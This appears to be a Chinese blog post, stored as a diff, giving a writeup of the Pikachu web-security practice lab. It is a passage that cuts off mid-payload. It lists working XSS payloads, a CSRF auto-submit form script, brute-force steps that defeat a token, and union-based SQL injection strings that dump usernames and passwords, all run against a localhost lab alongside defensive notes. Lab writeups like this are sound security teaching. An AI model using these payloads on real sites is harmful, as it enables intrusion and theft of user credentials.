@@ -1,0 +1,1051 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon/favicon.png">
+  <link rel="icon" href="/img/favicon/favicon.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Mobilis In Mobili">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Pikachu 是国人hanlu 开发的一套 Web 渗透靶场，以人性化、友好度高著称。这里将记录其 Writeup 和一些笔记。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Pikachu 靶场 Writeup">
+<meta property="og:url" content="https://justloseit.top/Pikachu%20%E9%9D%B6%E5%9C%BA%20Writeup/index.html">
+<meta property="og:site_name" content="动中之动">
+<meta property="og:description" content="Pikachu 是国人hanlu 开发的一套 Web 渗透靶场，以人性化、友好度高著称。这里将记录其 Writeup 和一些笔记。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://justloseit.top/img/index/Pikachu%20%E9%9D%B6%E5%9C%BA%20Writeup.jpg">
+<meta property="article:published_time" content="2021-11-29T10:19:04.000Z">
+<meta property="article:modified_time" content="2022-11-21T12:46:25.132Z">
+<meta property="article:author" content="Mobilis In Mobili">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Pikachu">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://justloseit.top/img/index/Pikachu%20%E9%9D%B6%E5%9C%BA%20Writeup.jpg">
+  
+  
+  
+  <title>Pikachu 靶场 Writeup - 动中之动</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"justloseit.top","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":60,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":"§"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":false,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"snI2XNrHrhyx5g84m3Uim3EC-gzGzoHsz","app_key":"x2YseXJIHmvnsM4v9y9UAlvu","server_url":"https://sni2xnrh.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="/atom.xml" title="动中之动" type="application/atom+xml">
+</head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Mobilis In Mobili</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/banner/Pikachu%20%E9%9D%B6%E5%9C%BA%20Writeup.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Pikachu 靶场 Writeup"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        Mobilis In Mobili
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2021-11-29 18:19" pubdate>
+          2021年11月29日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.3k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          28 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Pikachu 靶场 Writeup</h1>
+            
+              <p id="updated-time" class="note note-info" style="">
+                
+                  
+                    本文最后更新于 2022年11月21日 晚上
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <p>Pikachu 是国人<a target="_blank" rel="noopener" href="https://github.com/zhuifengshaonianhanlu">hanlu</a> 开发的一套 Web 渗透靶场，以人性化、友好度高著称。这里将记录其 Writeup 和一些笔记。</p>
+<span id="more"></span>
+<p>P.S.: 图片都进行了压缩，是因为多图杀猫。</p>
+<h1 id="pikachu-靶场-writeup"><a class="markdownIt-Anchor" href="#pikachu-靶场-writeup"></a> Pikachu 靶场 Writeup</h1>
+<h2 id="暴力爆破"><a class="markdownIt-Anchor" href="#暴力爆破"></a> 暴力爆破</h2>
+<blockquote>
+<p>从来没有哪个时代的黑客像今天一样热衷于猜解密码  —— 奥斯特洛夫斯基</p>
+</blockquote>
+<ul>
+<li>我们说一个web应用系统存在暴力破解漏洞，一般是指该 Web 应用系统没有采用或者采用了比较弱的认证安全策略，导致其被暴力破解的“可能性”变的比较高。
+<ul>
+<li>这里的认证安全策略, 包括：
+<ol>
+<li>是否要求用户设置复杂的密码；</li>
+<li>是否每次认证都使用安全的验证码或者手机 OTP；</li>
+<li>是否对尝试登录的行为进行判断和限制（如：连续 5次错误登录，进行账号锁定或 IP 地址锁定等）；</li>
+<li>是否采用了双因素认证；</li>
+<li>等等。</li>
+</ol>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="基于表单的暴力破解"><a class="markdownIt-Anchor" href="#基于表单的暴力破解"></a> 基于表单的暴力破解</h3>
+<ul>
+<li>没有验证码，直接使用 BurpSuite 的 Intruder 模块进行爆破即可。</li>
+</ul>
+<div class="note note-success">
+            <p>（Intruder 模块的 Attack Type）</p><ul><li>Sniper：<ul><li>仅用一组 Payload。</li><li>依次瞄准每个 Payload 的位置，并一次将 Payload 放置到该位置（其他位置此时保持空白）。</li><li>请求的总数是 Payload 的位置数 * Payload 的个数。</li></ul></li><li>Battering ram<ul><li>仅用一组 Payload。</li><li>同时将 Payload 放置到每个位置（所有位置此时保持一致）。</li><li>请求的总数是 Payload 的个数。</li></ul></li><li>Pitchfork<ul><li>使用多组 Payload。</li><li>攻击<strong>同时遍历</strong>所有 Payload 集，并将一个 Payload 放入每个定义的位置。</li><li>请求的总数是最小 Payload 集中的 Payload 数。</li></ul></li><li>Cluster bomb<ul><li>使用多组 Payload。</li><li>攻击<strong>依次迭代</strong>每个 Payload 集，以便测试 Payload 组合的所有排列。</li><li>请求的总数是所有 Payload 集中的 Payload 数的乘积。【非常巨大】</li></ul></li></ul>
+          </div>
+<h3 id="验证码绕过on-server"><a class="markdownIt-Anchor" href="#验证码绕过on-server"></a> 验证码绕过(on server)</h3>
+<ul>
+<li>有验证码，使用 BurpSuite 的 Reapter 模块，发现在输入错误账号密码的情况下，验证码是不变的。<strong>用户仅在输错验证码的情况下更新</strong>，按上题爆破即可。</li>
+</ul>
+<h3 id="验证码绕过on-client"><a class="markdownIt-Anchor" href="#验证码绕过on-client"></a> 验证码绕过(on client)</h3>
+<ul>
+<li>有验证码，但是在前端上的。删除相应的 JavaScript 代码即可同上爆破。</li>
+</ul>
+<h3 id="token防爆破"><a class="markdownIt-Anchor" href="#token防爆破"></a> token防爆破?</h3>
+<div class="note note-success">
+            <p>（Token 令牌防重放）</p><ol><li>在服务器端生成一个唯一的随机标识号 Token，同时在当前用户的 Session 域中保存这个 Token；</li><li>然后将 Token 发送到客户端的 Form 表单中，在 Form 表单中使用<strong>隐藏域</strong>来存储这个 Token；</li><li>表单提交的时候连同这个 Token 一起提交到服务器端，然后在服务器端判断客户端提交上来的Token与服务器端生成的Token是否一致：<ul><li>如果不一致，说明是重复提交，此时服务器端就可以不处理重复提交的表单。</li><li>如果一致，说明是处理表单提交，处理完后清除当前用户的 Session 域中存储的 Token。</li></ul></li></ol>
+          </div>
+<ul>
+<li>
+<p>抓包，发现<strong>返回包里有 token 的新值</strong>，所以要实现爆破，必须记录在每次发包时使用上次返回包中的 token。</p>
+<div align=center><img src="/img/post/Pikachu 靶场 Writeup/返回 token.jpg" srcset="/img/loading.gif" lazyload style="zoom:60%;" /></div>
+</li>
+<li>
+<p>首先要注意的是，必须得用单线程了——否则 token 肯定对不上。除此之外，得设置 token 的 payload 为返回包的 token。</p>
+</li>
+<li>
+<p>单线程直接在 Intruder 模块的 <code>Options--Request Engine--Number of threads</code> 中修改即可。</p>
+</li>
+<li>
+<p>每次发包使用上次返回包中的 token,首先抓取返回包中的 token：</p>
+<div align=center><img src="/img/post/Pikachu 靶场 Writeup/提取上一次的 token.jpg" srcset="/img/loading.gif" lazyload style="zoom: 60%;" /></div>
+</li>
+<li>
+<p>Payload 的位置有两个，因此使用 Pitchfork 模式。第一个密码按照之前正常爆破就行；后者需要使用提取的 Token。</p>
+<div align=center><img src="/img/post/Pikachu 靶场 Writeup/token 设置 Pitchfork.jpg" srcset="/img/loading.gif" lazyload style="zoom: 40%;" /></div>
+<div align=center><img src="/img/post/Pikachu 靶场 Writeup/第二个 payload 集.jpg" srcset="/img/loading.gif" lazyload style="zoom: 40%;" /></div>
+</li>
+<li>
+<p>除此之外，还需要设置重定向，保证发包收包是连续的：</p>
+<div align=center><img src="/img/post/Pikachu 靶场 Writeup/设置重定向.jpg" srcset="/img/loading.gif" lazyload style="zoom: 60%;" /></div>
+</li>
+<li>
+<p>最后爆破成功。可以看到 <code>123456789</code> 的长度也和其他的不一样，这是因为它是爆破数据的第一个，token 是没有正确匹配的。</p>
+<div align=center><img src="/img/post/Pikachu 靶场 Writeup/token 爆破成功.jpg" srcset="/img/loading.gif" lazyload style="zoom: 60%;" /></div>
+</li>
+</ul>
+<div class="note note-warning">
+            <p>因此，Token 是不能防爆破的。</p>
+          </div>  
+<h2 id="cross-site-scripting"><a class="markdownIt-Anchor" href="#cross-site-scripting"></a> Cross-Site Scripting</h2>
+<ul>
+<li>
+<p>Cross-Site Scripting 简称为“CSS”，为避免与前端叠成样式表冲突，故又称 XSS。</p>
+</li>
+<li>
+<p>一般 XSS 可以分为如下几种常见类型：<br />
+1.反射性 XSS;<br />
+2.存储型 XSS;<br />
+3.DOM型 XSS;</p>
+</li>
+<li>
+<p>XSS 是一种发生在前端浏览器端的漏洞，所以其危害的对象也是<strong>前端用户</strong>。</p>
+</li>
+<li>
+<p>在 XSS 漏洞的防范上，一般会采用两种方式进行处理:</p>
+<ol>
+<li>输入过滤</li>
+<li>输出转义</li>
+</ol>
+</li>
+</ul>
+<h3 id="反射型-xssget"><a class="markdownIt-Anchor" href="#反射型-xssget"></a> 反射型 xss(get)</h3>
+<ul>
+<li>
+<p>输入框有字符数限制，有两种做法</p>
+<ol>
+<li>直接通过 Hackbar，发送 Payload</li>
+</ol>
+  <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>localhost<span class="hljs-regexp">/pikachu/</span>vul<span class="hljs-regexp">/xss/</span>xss_reflected_get.php?message=&lt;script&gt;alert(<span class="hljs-regexp">/xss/</span>)&lt;/script&gt;&amp;submit=submit<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
+<ol start="2">
+<li>删除前端关于字符数限制的 JavaScript 代码</li>
+</ol>
+</li>
+</ul>
+<div class="note note-primary">
+            <p>输入 “kobe” 有彩蛋。🏀</p>
+          </div>
+<h3 id="反射型-xsspost"><a class="markdownIt-Anchor" href="#反射型-xsspost"></a> 反射型 xss(post)</h3>
+<ul>
+<li>登录后输入 <code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code> 即可</li>
+</ul>
+<h3 id="存储型-xss"><a class="markdownIt-Anchor" href="#存储型-xss"></a> 存储型 xss</h3>
+<ul>
+<li>输入 <code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code> 即可，相比于反射型，该 xss 存储在服务器上。之后刷新即可再次触发</li>
+</ul>
+<div class="note note-primary">
+            <p>存在一个 sql 注入的彩蛋⭕</p>
+          </div>  
+<h3 id="dom-型-xss"><a class="markdownIt-Anchor" href="#dom-型-xss"></a> DOM 型 xss</h3>
+<div class="note note-success">
+            <ul><li>W3C 文档对象模型（DOM）是一个使程序和脚本有能力动态地访问和更新文档的内容、结构以及样式的平台和语言中立的<strong>接口</strong>。</li><li>DOM 型 XSS 是基于 DOM 文档对象模型的一种漏洞。DOM 型 XSS 也能算广义的反射型 XSS，但 DOM 型 XSS 并不会和后台进行交互，仅涉及 Web 前端的安全问题，只能在客户端上进行防御。</li></ul>
+          </div>
+<ul>
+<li>输入 <code>123</code>，出现 <code>what do you see?</code>。查看源码 <code>document.getElementById(&quot;dom&quot;).innerHTML = &quot;&lt;a href='&quot;+str+&quot;'&gt;what do you see?&lt;/a&gt;&quot;;</code>，发现是拼接到 <code>&lt;a href=&quot;123&quot;&gt;what do you see?&lt;/a&gt;</code> 中。需要构造的目标是 <code>&lt;a href=&quot;&quot; onclick=&quot;alert(/xss/)&quot;&gt;</code>，所以输入 <code>' onclick=&quot;alert(/xss/)&quot;&gt;</code> 即可。</li>
+</ul>
+<h3 id="dom-型-xss-x"><a class="markdownIt-Anchor" href="#dom-型-xss-x"></a> DOM 型 xss-x</h3>
+<ul>
+<li>构造方式相同，仍然是输入 <code>' onclick=&quot;alert(/xss/)&quot;&gt;</code>，输入后 URL 变成 <code>http://localhost/pikachu/vul/xss/xss_dom_x.php?text='+onclick=&quot;alert(/xss/)&quot;&gt;</code>，点击“有些费尽心机想要忘记的事情,后来真的就忘掉了”，触发 <code>domxss()</code>。</li>
+<li>从源码中可以看出，它重新拼接得到新的链接 <code>&quot;&lt;a href='&quot;+xss+&quot;'&gt;就让往事都随风,都随风吧&lt;/a&gt;&quot;</code>，而点击该链接就会触发 xss。</li>
+</ul>
+<div class="note note-warning">
+            <ul><li>DOM 型 XSS 只在前端,与后端毫无关系。而 DOM-X 型能够像反射型一样在 URL 中体现,将 URL 发给了受害者就能进行攻击。</li><li>所以 DOM 型 xss 也不是完完全全的鸡肋。<br />（飞雷神·二段🥷）</li></ul><div align=center><img src="/img/post/Pikachu 靶场 Writeup/飞雷神二段.gif" srcset="/img/loading.gif" lazyload style="zoom: 100%;" /></div>
+          </div>  
+<h3 id="xss-之盲打"><a class="markdownIt-Anchor" href="#xss-之盲打"></a> xss 之盲打</h3>
+<div class="note note-success">
+            <p>XSS盲打是一种攻击场景：尽可能地于一切可能的地方提交 XSS 语句,只要后台管理员看到某一条语句,此语句就能被执行。</p>
+          </div>
+<ul>
+<li>看到输入框就插上 xss 语句，前端无回显，但是管理员一登陆就会被触发。</li>
+</ul>
+<h3 id="xss-之过滤"><a class="markdownIt-Anchor" href="#xss-之过滤"></a> xss 之过滤</h3>
+<ul>
+<li>输入 <code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code>，只回显“别说这些’&gt;'的话,不要怕,就是干!”，显然是被过滤了。使用大小写绕过即可。</li>
+<li>尝试了重写绕过和注释绕过均失败。</li>
+</ul>
+<div class="note note-primary">
+            <p>输入 “yes” 有彩蛋😂</p>
+          </div>  
+<h3 id="xss-之-htmlspecialchars"><a class="markdownIt-Anchor" href="#xss-之-htmlspecialchars"></a> xss 之 htmlspecialchars</h3>
+<div class="note note-success">
+            <ul><li>PHP htmlspecialchars() 函数：把预定义的字符转换为 HTML 实体<ul><li>&amp; （和号）成为 &amp;amp</li><li>&quot; （双引号）成为 &amp;quot</li><li>’ （单引号）成为 &amp;#039</li><li>&lt; （小于）成为 &amp;lt</li><li><blockquote><p>（大于）成为 &amp;gt</p></blockquote></li></ul></li><li>但是，引号类型是<strong>可选的</strong>：<ul><li>ENT_COMPAT - 默认。仅编码双引号。</li><li>ENT_QUOTES - 编码双引号和单引号。</li><li>ENT_NOQUOTES - 不编码任何引号。</li></ul></li></ul>
+          </div>
+<ul>
+<li>输入 <code>&amp; &quot; ' &lt; &gt;</code> 进行测试，发现仅单引号未过滤，说明是 <code>ENT_COMPAT</code>。构造 <code>' onclick = 'alert(1)'</code> 即可。</li>
+</ul>
+<h3 id="xss-之-href-输出"><a class="markdownIt-Anchor" href="#xss-之-href-输出"></a> xss 之 href 输出</h3>
+<div class="note note-success">
+            <ul><li>JavaScript 伪协议：关联应用程序而使用的协议即为伪协议（对比 HTTP/HTTPS 这种真协议）。该协议声明了 URL 的主体 是 JavaScript 代码，并由 javascript 的解释器运行。</li><li>大名鼎鼎的 <code>javascript:void(0)</code> 就是典型范例</li></ul>
+          </div>
+<ul>
+<li>输入 <code>&amp; &quot; ' &lt; &gt;</code> 进行测试，发现全被过滤。所以使用 JavaScript 伪协议 <code>javascript:alert(1)</code> 即可。</li>
+</ul>
+<div class="note note-primary">
+            <p>输入 <a target="_blank" rel="noopener" href="http://www.baidu.com">www.baidu.com</a> 有彩蛋。❗</p>
+          </div>
+<h3 id="xss-之-js-输出"><a class="markdownIt-Anchor" href="#xss-之-js-输出"></a> xss 之 js 输出</h3>
+<ul>
+<li>JavaScript 里面是不会对 tag 和字符实体进行解释的。这道题更多的是要考虑怎么修：在 JavaScript 的输出点应该使用 \ 对特殊字符进行转义</li>
+<li>闭合 <code>$ms</code> 即可。Payload：<code>'&lt;/script&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;'</code></li>
+</ul>
+<div class="note note-primary">
+            <p>输入 tmac 有彩蛋。🏀</p>
+          </div>
+<h2 id="csrf"><a class="markdownIt-Anchor" href="#csrf"></a> CSRF</h2>
+<ul>
+<li>Cross-site request forgery 跨站请求伪造：在 CSRF 的攻击场景中攻击者会伪造一个请求，然后欺骗目标用户进行点击，用户一旦点击了这个请求，整个攻击就完成了。</li>
+<li>防止 CSRF 的方法：
+<ul>
+<li>对敏感信息的操作增加安全的 token；</li>
+<li>对敏感信息的操作增加安全的验证码；</li>
+<li>对敏感信息的操作实施安全的逻辑流程，比如修改密码时，需要先校验旧密码等。</li>
+</ul>
+</li>
+</ul>
+<h3 id="csrfget"><a class="markdownIt-Anchor" href="#csrfget"></a> CSRF(get)</h3>
+<ul>
+<li>根据右上角的提示可以登录进个人信息修改页面，提交并抓包，发现是 <code>GET</code> 传参且没有 token。所以构造 payload：<code>http://localhost/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=123&amp;phonenum=&amp;add=&amp;email=&amp;submit=submit</code>， 诱导点击即可</li>
+</ul>
+<h3 id="csrfpost"><a class="markdownIt-Anchor" href="#csrfpost"></a> CSRF(post)</h3>
+<ul>
+<li>相比于前一题，这里抓包发现是 <code>POST</code> 传参。因此，应该做一个<strong>自动提交表单</strong>的恶意页面挂在服务器上并让受害者触发。当用户点击这个恶意页面的链接时，就会自动向存在 CSRF 的服务器提交 <code>POST</code> 请求修改个人信息。</li>
+<li>看了<a target="_blank" rel="noopener" href="https://www.naraku.cn/posts/25.html">Pikachu漏洞靶场系列之CSRF</a>，这里使用 OWASP 家的工具 <code>CSRFTester</code>。但是实际使用时，我没能成功抓包（<s>Java 一生之敌</s>）。再加之此工具实在太老了……因此，我转而使用了<a target="_blank" rel="noopener" href="https://security.love/CSRF-PoC-Genorator/">CSRF PoC Generator<br />
+</a>（其实自行编写相应的 html 也是可行的）</li>
+</ul>
+<div align=center><img src="/img/post/Pikachu 靶场 Writeup/CSRF_POC_Generator.jpg" srcset="/img/loading.gif" lazyload style="zoom: 50%;" /></div>
+<ul>
+<li>
+<p>不过这个 poc 没有加入自动提交表单，所以加个自动点击提交按钮就行</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">      <span class="hljs-variable language_">window</span>.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">          <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;postsubmit&quot;</span>).<span class="hljs-title function_">click</span>();</span><br><span class="language-javascript">      &#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+</li>
+<li>
+<p>放到服务器目录下，然后点击链接即可触发</p>
+</li>
+</ul>
+<h3 id="csrftoken"><a class="markdownIt-Anchor" href="#csrftoken"></a> CSRF(token)</h3>
+<ul>
+<li>相比于之前的个人信息修改页面，它在 Form 表单的隐藏域中增加了 token 字段：</li>
+</ul>
+<div align=center><img src="/img/post/Pikachu 靶场 Writeup/csrf_新增token.jpg" srcset="/img/loading.gif" lazyload style="zoom: 50%;" /></div>
+<ul>
+<li>而在修改时，它会验证 token，并在验证后调用 <code>set_token()</code> 重新生成 token：</li>
+</ul>
+<div align=center><img src="/img/post/Pikachu 靶场 Writeup/csrf_生成token.jpg" srcset="/img/loading.gif" lazyload style="zoom: 50%;" /></div>
+<ul>
+<li>因此无法进行 CSRF 攻击。<strong>使用 token 是一个防御 CSRF 攻击的方法。</strong></li>
+</ul>
+<h2 id="sql-inject"><a class="markdownIt-Anchor" href="#sql-inject"></a> SQL-Inject</h2>
+<ul>
+<li>
+<p>SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行，从而导致数据库受损。</p>
+</li>
+<li>
+<p>防御方法：</p>
+<ol>
+<li>对传进SQL语句里面的变量进行过滤，不允许危险字符传入；</li>
+<li>使用参数化（Parameterized Query/Parameterized Statement）；</li>
+<li>目前有很多ORM框架会自动使用参数化解决注入问题,但其也提供了“<strong>拼接</strong>”的方式,所以使用时需要慎重!</li>
+</ol>
+</li>
+</ul>
+<h3 id="数字型注入post"><a class="markdownIt-Anchor" href="#数字型注入post"></a> 数字型注入（post）</h3>
+<ul>
+<li>BurpSuite 抓包，在 Repeater 中修改 id，查看响应结果。</li>
+<li>payload：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs mysql"># 判断注入类型。【说明是数字型】<br>id=1 and 1 = 1<br>id=1 and 1 = 2<br><br># 确定字段（列）数。【后者报错，说明字段（列）数为 2】<br>id=1 order by 2 <br>id=1 order by 3 <br><br># 联合查询查看显示位。【有两个显示位】<br>id=0 union select 1,2 <br><br># 爆库名。【得到库名 pikachu。前者是所有库名，后者是查询当前所使用的数据库】<br>id=0 union select 1,group_concat(schema_name) from information_schema.schemata<br>## 或者<br>id=0 union select 1,database()<br><br># 爆表名。【得到表名 ...users...】<br>id=0 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() <br><br># 爆列名。【得到列名 ...username,password...】<br>id=0 union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; <br><br># 爆值。【得到用户名-密码对】<br>id=0 union select 1,group_concat(username,&#x27;-&#x27;,password) from users<br></code></pre></td></tr></table></figure>
+<h3 id="字符型注入get"><a class="markdownIt-Anchor" href="#字符型注入get"></a> 字符型注入（get）</h3>
+<ul>
+<li>payload：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs mysql"># 判断注入类型。【说明是字符型】<br>id=1&#x27; or 1=1#<br>id=1&#x27; or 1=2#<br><br># 确定字段（列）数。【后者报错，说明字段（列）数为 2】<br>id=1&#x27; order by 2#<br>id=1&#x27; order by 3# <br><br># 联合查询查看显示位。【有两个显示位】<br>id=0&#x27; union select 1,2# <br><br># 爆库名。【得到库名 